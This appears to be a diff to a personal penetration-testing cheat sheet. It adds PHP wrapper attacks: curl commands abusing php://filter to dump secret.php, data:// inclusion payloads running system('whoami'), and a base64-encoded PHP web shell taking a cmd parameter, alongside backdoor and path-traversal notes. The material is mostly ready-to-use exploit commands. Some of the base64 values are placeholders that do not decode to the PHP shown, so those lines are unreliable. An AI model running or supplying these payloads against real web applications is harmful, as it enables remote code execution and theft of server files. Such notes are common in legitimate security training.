@@ -12,6 +12,25 @@ PHP Payload
 simple-backdoor.php?cmd=cat%20/opt/install.txt
 # above file uploaded function over http call
 
+PHPWrappers
+# When the <body> is not closed, can indicate content not being displayed, so we can use Wraper to get them
+
+# php://filter
+# can read and execute php files
+curl http://superalexsec.com/xpto/index.php?page=php://filter/convert.base64-encode/resource=secret.php
+# This call to php://filter will try the execution encoding in base64 the content.
+echo "kaljsdfj23ij92jejfl==" | base64 -d
+# will decode the answare
+
+data://
+# either plain text or base64-encoded data to include elements within the code of a running web application.
+curl "http://superalexsec.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('whoami');?>"
+# Will insert data on php and execute it
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+666666239asjdkfqaw34==
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,666666239asjdkfqaw34==&cmd=whoami"
+# Will try to bypass filter using encoding, needs the cmd parameter with the command
+
 Path traversal
 /../../../../../../../../users/install.txt
 curl --path-as-is
